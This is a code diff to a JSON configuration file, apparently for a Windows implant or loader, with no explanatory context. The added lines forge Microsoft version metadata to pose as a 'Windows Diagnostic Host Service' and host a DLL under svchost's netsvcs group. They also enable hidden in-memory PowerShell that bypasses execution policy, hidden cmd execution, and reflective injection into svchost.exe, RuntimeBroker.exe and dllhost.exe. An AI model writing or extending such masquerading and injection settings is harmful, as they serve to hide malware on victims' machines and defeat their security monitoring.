@@ -11,7 +11,45 @@
     "logPath": "C:/Windows/System32/DiagnosticHost/logs",
     "versionInfo": {
       "fileVersion": "10.0.19041.0",
-      "productVersion": "10.0.19041.0"
+      "productVersion": "10.0.19041.0",
+      "fileDescription": "Windows Diagnostic Host Service",
+      "internalName": "diaghost.exe",
+      "legalCopyright": "© Microsoft Corporation. All rights reserved.",
+      "originalFilename": "diaghost.exe"
+    }
+  },
+  "serviceHosting": {
+    "enabled": true,
+    "hostType": "svchost",
+    "serviceGroup": "netsvcs",
+    "serviceDll": "diagsvc.dll",
+    "dllPath": "C:/Windows/System32/DiagnosticHost/diagsvc.dll",
+    "parameters": {
+      "ServiceMain": "ServiceMain",
+      "ServiceDll": "%SystemRoot%\\System32\\DiagnosticHost\\diagsvc.dll"
+    }
+  },
+  "execution": {
+    "inMemory": {
+      "enabled": true,
+      "powershell": {
+        "enabled": true,
+        "method": "runspace",
+        "noProfile": true,
+        "noLogo": true,
+        "bypassExecutionPolicy": true
+      },
+      "cmd": {
+        "enabled": true,
+        "method": "createProcess",
+        "hideWindow": true,
+        "redirectOutput": true
+      }
+    },
+    "processInjection": {
+      "enabled": true,
+      "targetProcesses": ["svchost.exe", "RuntimeBroker.exe", "dllhost.exe"],
+      "injectionMethod": "reflective"
     }
   },
   "network": {
